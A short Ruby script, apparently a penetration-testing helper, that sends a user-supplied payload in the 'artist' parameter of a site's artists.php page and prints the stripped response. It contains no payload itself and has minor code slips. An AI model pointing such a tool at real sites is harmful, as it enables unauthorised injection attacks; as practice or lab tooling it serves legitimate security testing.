#!/usr/bin/env ruby
#
#send payload from command line

require 'net/http'

if ARGV.size < 2
  puts "[!] #{__FILE__} [IP ADDRESS] [PAYLOAD]"
  exit 0
else
  host, payload = ARGV
end

uri = URI.parse("http://#{host}/artists.php?")
uri.query = URI.encode_www_form({"artist" => "#{payload}"})
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true if uri.scheme == "https"
#http.set_debug_outpost($stdout)

request = Net::HTTP::Get.new(uri.request_uri)
response = http.request(request)
puts "[+] Status code: " + response.code + "\n\n"
puts response.body.gsub(/<.*?>/, '').strip
puts response.body.scan(/<h2 id='pageName'>.<\/h2>/).join.gsub(/<.*?>/, '').strip

puts ""
